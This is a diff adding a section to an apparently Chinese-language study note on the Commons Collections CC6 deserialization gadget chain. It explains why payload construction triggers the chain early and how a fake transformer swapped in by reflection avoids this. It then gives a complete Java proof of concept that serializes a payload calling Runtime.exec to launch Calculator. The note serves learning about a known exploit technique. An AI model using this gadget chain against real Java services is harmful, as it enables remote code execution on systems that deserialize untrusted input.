@@ -180,3 +180,71 @@ public class CC6 {
 
 ```
 
+## 注意点3
+
+我们在构造序列化对象的时候，由于这里执行了这个，而这个put方法里面会执行hash()，所以就会导致在序列化的时候就会把整个利用链走一遍
+
+```java
+expMap.put(tme,"value");
+```
+
+这里看ysoserial有个解决办法，就是构造LazyMap的时候用一个fakeTransformers对象
+
+等到最后生成payload的时候再用反射，`getDeclaredField`，把真正的恶意transformer换进去
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6pro {
+    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
+        Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })};
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        "getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer("exec",
+                        new Class[] { String.class }, new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
+                new ConstantTransformer(1) };
+
+// 传入fake防止序列化时执行
+        Transformer transformerChain = new ChainedTransformer(faketransformer);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry tme = new TiedMapEntry(outerMap,"key");
+        HashMap expMap = new HashMap();
+        expMap.put(tme,"value");
+        outerMap.remove("key");
+
+// 到最后生成payload的时候，利用反射把真正的transform换进去
+        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+
+// 序列化数据
+        FileOutputStream fileInputStream = new FileOutputStream(new File("./1.txt"));
+        ObjectOutputStream oos = new ObjectOutputStream(fileInputStream);
+        oos.writeObject(expMap);
+        oos.close();
+
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("./1.txt")));
+        Object o = (Object) ois.readObject();
+    }
+}  
+```
+
+
